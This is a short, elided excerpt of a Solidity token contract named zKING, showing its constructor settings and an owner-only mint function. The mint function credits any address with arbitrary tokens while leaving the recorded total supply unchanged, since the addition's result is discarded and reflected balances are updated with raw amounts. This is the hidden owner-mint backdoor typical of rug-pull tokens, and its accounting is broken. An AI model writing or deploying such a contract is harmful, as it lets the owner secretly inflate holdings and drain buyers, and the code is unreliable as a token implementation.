...
contract zKING is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _symbol = "ZKING";
        _decimals = 9;
        _tTotal = 100000000000*1e9;
        _rTotal = (MAX - (MAX % _tTotal));
        
        marketingAddress = payable(msg.sender);
        dappbuilderAddress = payable(msg.sender);
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x744932Dd6B8BD68a009f422177a9903B61aACC3E);
    ...
    function mint(address _recipient, uint256 _amount) public onlyOwner {
        _rOwned[_recipient] = _rOwned[_recipient].add(_amount);
        _tTotal.add(_amount);
    }
